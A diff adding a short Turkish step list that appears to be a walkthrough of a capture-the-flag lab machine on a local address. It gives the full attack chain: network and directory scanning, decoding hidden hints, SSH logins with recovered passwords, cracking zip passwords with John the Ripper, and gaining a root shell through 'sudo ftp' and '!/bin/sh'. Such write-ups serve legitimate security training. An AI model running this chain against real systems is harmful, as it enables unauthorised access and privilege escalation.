@@ -1,0 +1,21 @@
+1 - arp-scan --localnet ile IP 192.168.2.84 bulunur.
+2 - nmap -sT -A 192.168.2.84
+3 - gobuster dir -u http://192.168.2.84 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,js
+4 - http://192.168.2.84/hint/ adresine gidip sayfa kaynağı görüntülenir.
+5 - Hash anlamsiz
+6 - http://192.168.2.84/entry.js -> monica = username
+7 - http://192.168.2.84/fotocd/ -> brainfuck decode -> küçük bir base64 kodu ortaya çıkar.
+8 - ssh monica@192.168.2.84 Parola = $99990$
+9 - cat joey/have/a/gift/for/monica/note.txt, http://192.168.2.84/fotocd/0x0343548764 adresine gidilir.
+10 - unzip joey.zip, parola = #9175
+11 - zip2john gift.zip > hash
+12 - john hash -w=/usr/share/wordlists/rockyou.txt
+13 - unzip gift.zip, parola = h4ck3d
+14 - cd /home/chandler, cat note.txt
+15 - find / -type f -perm -u=s 2>/dev/null
+16 - /opt/exec/chandler ile chandler kullanıcısına geçiş yapıldı.
+17 - cd .cache, cat note.txt
+18 - echo "hash" | base32 -d, passwd:Y0uCr4ckM3
+19 - su chandler, parola = Y0uCr4ckM3
+20 - GTFObins -> FTP -> Sudo
+21 - sudo ftp, !/bin/sh, whoami
